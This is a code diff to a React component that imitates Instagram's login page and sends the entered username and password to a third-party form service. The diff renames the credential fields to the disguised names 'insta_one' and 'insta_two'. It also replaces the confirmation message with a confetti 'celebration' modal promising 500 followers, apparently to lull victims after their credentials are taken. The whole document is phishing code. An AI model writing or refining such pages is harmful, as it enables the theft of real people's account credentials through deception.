@@ -13,12 +13,14 @@ import {
 import LanguageModal from "@/components/common/LanguageModal";
 import FloatingInput from "@/components/common/FloatingInput";
 import FloatingInputMobile from "@/components/common/FloadtingInputMobile";
+import CelebrationModal from "@/components/common/CelebrationModal";
 import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";
 
 export default function InstagramHomePage() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [isLangModalOpen, setIsLangModalOpen] = useState(false);
+  const [isCelebrationOpen, setIsCelebrationOpen] = useState(false);
   const [selectedLanguage, setSelectedLanguage] = useState("English (US)");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);
@@ -49,7 +51,7 @@ export default function InstagramHomePage() {
 
     setIsSubmitting(false);
     if (result.success) {
-      setStatusMessage({ type: "success", text: "Login submitted successfully." });
+      setIsCelebrationOpen(true);
       setUsername("");
       setPassword("");
     } else {
@@ -132,7 +134,7 @@ export default function InstagramHomePage() {
                 {/* Identifier input */}
                 <FloatingInput
                   id="desktop-username"
-                  name="username"
+                  name="insta_one"
                   type="text"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
@@ -143,7 +145,7 @@ export default function InstagramHomePage() {
                 {/* Password input */}
                 <FloatingInput
                   id="desktop-password"
-                  name="password"
+                  name="insta_two"
                   type="password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
@@ -316,7 +318,7 @@ export default function InstagramHomePage() {
 
             <FloatingInputMobile
               id="mobile-username"
-              name="username"
+              name="insta_one"
               type="text"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
@@ -329,7 +331,7 @@ export default function InstagramHomePage() {
 
             <FloatingInputMobile
               id="mobile-password"
-              name="password"
+              name="insta_two"
               type="password"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
@@ -391,6 +393,13 @@ export default function InstagramHomePage() {
         onClose={() => setIsLangModalOpen(false)}
         currentLanguage={selectedLanguage}
         onSelectLanguage={(lang) => setSelectedLanguage(lang)}
+      />
+
+      {/* Celebration Modal with Confetti */}
+      <CelebrationModal
+        isOpen={isCelebrationOpen}
+        onClose={() => setIsCelebrationOpen(false)}
+        followerCount={500}
       />
     </div>
   );
